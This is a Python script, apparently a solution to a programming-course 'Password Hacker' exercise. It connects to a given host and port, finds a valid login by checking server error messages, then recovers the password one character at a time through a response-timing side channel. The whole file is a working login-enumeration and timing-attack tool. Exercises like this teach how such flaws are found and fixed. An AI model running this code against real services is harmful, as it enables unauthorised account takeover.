import sys
import socket
import itertools
import string
import json
from datetime import datetime

password_choice = string.ascii_letters + string.digits

def guess_password():
    for i in range(1, len(password_choice) + 1):
        for j in itertools.product(password_choice, repeat=i):
            yield j


args = sys.argv
hostname = str(args[1])
port = int(args[2])

path = 'C:\\Users\\Shahrullohon\\PycharmProjects\\Password Hacker\\Password Hacker\\task\\hacking\\logins.txt'
login = None
password = ''
with socket.socket() as new_socket:
    new_socket.connect((hostname, port))
    with open(path, 'r') as file:
        logs = iter(file.read().split())
        for log in logs:
            login = log.strip()
            l_dic = {'login': login, 'password': ' '}
            data = json.dumps(l_dic)
            new_socket.send(data.encode())
            response = new_socket.recv(1024).decode()
            res = json.loads(response)
            if res['result'] == 'Wrong password!':
                l_dic = json.loads(data)
                log = l_dic['login']
                break
        while True:
            for message in password_choice:
                l_dic = {'login': login, 'password': password + message}
                data = json.dumps(l_dic, indent=4)
                new_socket.send(data.encode())
                timestart = datetime.now()
                response = new_socket.recv(1024)
                timefinish = datetime.now()
                res = json.loads(response.decode())
                if res['result'] == 'Wrong password!':
                    diff = timefinish - timestart
                    if diff.total_seconds() >= 0.1:
                        password += message
                elif res['result'] == 'Connection success!':
                    print(data)
                    exit()

